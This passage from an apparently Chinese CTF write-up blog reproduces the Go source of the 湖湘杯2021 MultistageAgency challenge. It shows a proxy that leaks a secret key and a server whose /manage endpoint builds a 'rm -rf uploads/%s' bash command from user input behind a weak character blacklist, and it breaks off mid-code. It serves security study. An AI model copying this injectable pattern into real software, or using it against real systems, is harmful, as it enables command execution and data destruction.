</span></span></code></pre></div><p>————p牛在vulhub中给出的poc用的是LD_PRELOAD，但是由于这个题目的相关目录/etc/goahead/tmp是只读的，所以无法构造上传表单传.so</p><h3 id=湖湘杯2021-线下multistageagency>[湖湘杯2021 线下]MultistageAgency</h3><p><a href="https://ha1c9on.top/?p=1913">wp1</a> | <a href=https://guokeya.github.io/post/ZqfbSBz7J/>wp2</a></p><p>有proxy和web两个web用户起的服务，server由root起</p><p>proxy在内网的8080端口，主要提供返回<code>Secretkey</code>的功能</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#75af00>main</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>(</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;github.com/elazarl/goproxy&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;io/ioutil&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;log&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;net/http&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;os&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>main</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>file</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>Open</span><span style=color:#111>(</span><span style=color:#d88200>&#34;secret/key&#34;</span><span style=color:#111>)</span> <span style=color:#75715e>// 读取当前目录下的key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>panic</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>defer</span> <span style=color:#75af00>file</span><span style=color:#111>.</span><span style=color:#75af00>Close</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>content</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>ioutil</span><span style=color:#111>.</span><span style=color:#75af00>ReadAll</span><span style=color:#111>(</span><span style=color:#75af00>file</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>SecretKey</span> <span style=color:#f92672>:=</span> <span style=color:#111>string</span><span style=color:#111>(</span><span style=color:#75af00>content</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>proxy</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>goproxy</span><span style=color:#111>.</span><span style=color:#75af00>NewProxyHttpServer</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>proxy</span><span style=color:#111>.</span><span style=color:#75af00>Verbose</span> <span style=color:#111>=</span> <span style=color:#00a8c8>true</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>proxy</span><span style=color:#111>.</span><span style=color:#75af00>OnRequest</span><span style=color:#111>().</span><span style=color:#75af00>DoFunc</span><span style=color:#111>(</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>func</span><span style=color:#111>(</span><span style=color:#75af00>r</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>,</span><span style=color:#75af00>ctx</span> <span style=color:#f92672>*</span><span style=color:#75af00>goproxy</span><span style=color:#111>.</span><span style=color:#75af00>ProxyCtx</span><span style=color:#111>)(</span><span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>,</span><span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Response</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>Header</span><span style=color:#111>.</span><span style=color:#75af00>Set</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Secretkey&#34;</span><span style=color:#111>,</span><span style=color:#75af00>SecretKey</span><span style=color:#111>)</span> <span style=color:#75715e>// 返回包的请求头设置Secretkey
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>return</span> <span style=color:#75af00>r</span><span style=color:#111>,</span><span style=color:#00a8c8>nil</span>
</span></span><span style=display:flex><span>        <span style=color:#111>})</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;start listen 8080&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Fatal</span><span style=color:#111>(</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ListenAndServe</span><span style=color:#111>(</span><span style=color:#d88200>&#34;:8080&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>proxy</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>9091端口server，有命令注入点/manage和一个waf，并且需要本地ip访问</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#75af00>main</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>(</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;bytes&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;crypto/md5&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;fmt&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;io/ioutil&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;log&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;net/http&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;os&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;os/exec&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;unicode&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 检查来源ip为本地才继续执行
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>var</span> <span style=color:#75af00>SecretKey</span> <span style=color:#111>=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>getToken</span><span style=color:#111>(</span><span style=color:#75af00>w</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ResponseWriter</span><span style=color:#111>,</span> <span style=color:#75af00>r</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>header</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>Header</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>token</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;error&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>sks</span> <span style=color:#111>[]</span><span style=color:#00a8c8>string</span> <span style=color:#111>=</span> <span style=color:#75af00>header</span><span style=color:#111>[</span><span style=color:#d88200>&#34;Secretkey&#34;</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>sk</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>sks</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>sk</span> <span style=color:#111>=</span> <span style=color:#75af00>sks</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>fromHosts</span> <span style=color:#111>[]</span><span style=color:#00a8c8>string</span> <span style=color:#111>=</span> <span style=color:#75af00>header</span><span style=color:#111>[</span><span style=color:#d88200>&#34;Fromhost&#34;</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>fromHost</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>fromHosts</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>fromHost</span> <span style=color:#111>=</span> <span style=color:#75af00>fromHosts</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#75af00>fromHost</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#34;&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>sk</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#34;&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>sk</span> <span style=color:#f92672>==</span> <span style=color:#75af00>SecretKey</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>data</span> <span style=color:#f92672>:=</span> <span style=color:#111>[]</span><span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>sk</span> <span style=color:#f92672>+</span> <span style=color:#75af00>fromHost</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>has</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>md5</span><span style=color:#111>.</span><span style=color:#75af00>Sum</span><span style=color:#111>(</span><span style=color:#75af00>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>token</span> <span style=color:#111>=</span> <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Sprintf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;%x&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>has</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Fprintf</span><span style=color:#111>(</span><span style=color:#75af00>w</span><span style=color:#111>,</span> <span style=color:#75af00>token</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>manage</span><span style=color:#111>(</span><span style=color:#75af00>w</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ResponseWriter</span><span style=color:#111>,</span> <span style=color:#75af00>r</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>values</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>URL</span><span style=color:#111>.</span><span style=color:#75af00>Query</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>m</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>values</span><span style=color:#111>.</span><span style=color:#75af00>Get</span><span style=color:#111>(</span><span style=color:#d88200>&#34;m&#34;</span><span style=color:#111>)</span>	<span style=color:#75715e>// get方式传入m参数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span> <span style=color:#111>!</span><span style=color:#75af00>waf</span><span style=color:#111>(</span><span style=color:#75af00>m</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Fprintf</span><span style=color:#111>(</span><span style=color:#75af00>w</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;waf!&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>cmd</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Sprintf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;rm -rf uploads/%s&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>m</span><span style=color:#111>)</span>	<span style=color:#75715e>// 删除uploads/{m}下所有内容
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Println</span><span style=color:#111>(</span><span style=color:#75af00>cmd</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>command</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>exec</span><span style=color:#111>.</span><span style=color:#75af00>Command</span><span style=color:#111>(</span><span style=color:#d88200>&#34;bash&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;-c&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>cmd</span><span style=color:#111>)</span>	<span style=color:#75715e>// 命令注入点
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>outinfo</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>bytes</span><span style=color:#111>.</span><span style=color:#75af00>Buffer</span><span style=color:#111>{}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>outerr</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>bytes</span><span style=color:#111>.</span><span style=color:#75af00>Buffer</span><span style=color:#111>{}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Stdout</span> <span style=color:#111>=</span> <span style=color:#f92672>&amp;</span><span style=color:#75af00>outinfo</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Stderr</span> <span style=color:#111>=</span> <span style=color:#f92672>&amp;</span><span style=color:#75af00>outerr</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Start</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;ERROR&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Println</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>Error</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#111>=</span> <span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Wait</span><span style=color:#111>();</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>res</span> <span style=color:#111>=</span> <span style=color:#75af00>outerr</span><span style=color:#111>.</span><span style=color:#75af00>String</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>res</span> <span style=color:#111>=</span> <span style=color:#75af00>outinfo</span><span style=color:#111>.</span><span style=color:#75af00>String</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Fprintf</span><span style=color:#111>(</span><span style=color:#75af00>w</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>waf</span><span style=color:#111>(</span><span style=color:#75af00>c</span> <span style=color:#00a8c8>string</span><span style=color:#111>)</span> <span style=color:#00a8c8>bool</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>t</span> <span style=color:#00a8c8>int32</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>t</span> <span style=color:#111>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>blacklist</span> <span style=color:#f92672>:=</span> <span style=color:#111>[]</span><span style=color:#00a8c8>string</span><span style=color:#111>{</span><span style=color:#d88200>&#34;.&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;*&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;?&#34;</span><span style=color:#111>}</span>	<span style=color:#75715e>// 黑名单
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>for</span> <span style=color:#75af00>_</span><span style=color:#111>,</span> <span style=color:#75af00>s</span> <span style=color:#f92672>:=</span> <span style=color:#00a8c8>range</span> <span style=color:#75af00>c</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>for</span> <span style=color:#75af00>_</span><span style=color:#111>,</span> <span style=color:#75af00>b</span> <span style=color:#f92672>:=</span> <span style=color:#00a8c8>range</span> <span style=color:#75af00>blacklist</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#75af00>b</span> <span style=color:#f92672>==</span> <span style=color:#111>string</span><span style=color:#111>(</span><span style=color:#75af00>s</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#75af00>unicode</span><span style=color:#111>.</span><span style=color:#75af00>IsLetter</span><span style=color:#111>(</span><span style=color:#75af00>s</span><span style=color:#111>)</span> <span style=color:#111>{</span>	<span style=color:#75715e>// 是否为字母
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>if</span> <span style=color:#75af00>t</span> <span style=color:#f92672>==</span> <span style=color:#75af00>s</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>continue</span>	<span style=color:#75715e>// 如果下一个字符ascii==上一个字符 则继续
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#75af00>t</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>t</span> <span style=color:#111>=</span> <span style=color:#75af00>s</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>true</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>main</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>file</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>Open</span><span style=color:#111>(</span><span style=color:#d88200>&#34;secret/key&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>panic</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>defer</span> <span style=color:#75af00>file</span><span style=color:#111>.</span><span style=color:#75af00>Close</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>content</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>ioutil</span><span style=color:#111>.</span><span style=color:#75af00>ReadAll</span><span style=color:#111>(</span><span style=color:#75af00>file</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>SecretKey</span> <span style=color:#111>=</span> <span style=color:#111>string</span><span style=color:#111>(</span><span style=color:#75af00>content</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>HandleFunc</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>getToken</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>HandleFunc</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/manage&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>manage</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;start listen 9091&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>err</span> <span style=color:#111>=</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ListenAndServe</span><span style=color:#111>(</span><span style=color:#d88200>&#34;:9091&#34;</span><span style=color:#111>,</span> <span style=color:#00a8c8>nil</span><span style=color:#111>)</span> <span style=color:#75715e>// 监听端口 9091
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Fatal</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ListenAndServe: &#34;</span><span style=color:#111>,</span> <span style=color:#75af00>err</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>web服务，对外访问</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#75af00>main</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>(</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;bytes&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;crypto/md5&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;encoding/json&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;fmt&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;io&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;io/ioutil&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;log&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;math/rand&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;net/http&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;os&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;os/exec&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;path/filepath&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#d88200>&#34;strings&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>SecretKey</span> <span style=color:#111>=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>type</span> <span style=color:#75af00>TokenResult</span> <span style=color:#00a8c8>struct</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>Success</span> <span style=color:#00a8c8>string</span> <span style=color:#75af00>json</span><span style=color:#111>:</span><span style=color:#d88200>&#34;success&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>Failed</span> <span style=color:#00a8c8>string</span> <span style=color:#75af00>json</span><span style=color:#111>:</span><span style=color:#d88200>&#34;failed&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>letterBytes</span> <span style=color:#111>=</span> <span style=color:#d88200>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>RandStringBytes</span><span style=color:#111>(</span><span style=color:#75af00>n</span> <span style=color:#00a8c8>int</span><span style=color:#111>)</span> <span style=color:#00a8c8>string</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>b</span> <span style=color:#f92672>:=</span> <span style=color:#111>make</span><span style=color:#111>([]</span><span style=color:#00a8c8>byte</span><span style=color:#111>,</span> <span style=color:#75af00>n</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>for</span> <span style=color:#75af00>i</span> <span style=color:#f92672>:=</span> <span style=color:#00a8c8>range</span> <span style=color:#75af00>b</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>b</span><span style=color:#111>[</span><span style=color:#75af00>i</span><span style=color:#111>]</span> <span style=color:#111>=</span> <span style=color:#75af00>letterBytes</span><span style=color:#111>[</span><span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Intn</span><span style=color:#111>(</span><span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>letterBytes</span><span style=color:#111>))]</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#111>string</span><span style=color:#111>(</span><span style=color:#75af00>b</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>getToken</span><span style=color:#111>(</span><span style=color:#75af00>w</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ResponseWriter</span><span style=color:#111>,</span> <span style=color:#75af00>r</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>values</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>URL</span><span style=color:#111>.</span><span style=color:#75af00>Query</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>fromHostList</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>strings</span><span style=color:#111>.</span><span style=color:#75af00>Split</span><span style=color:#111>(</span><span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>RemoteAddr</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;:&#34;</span><span style=color:#111>)</span> <span style=color:#75715e>// 获取来源ip
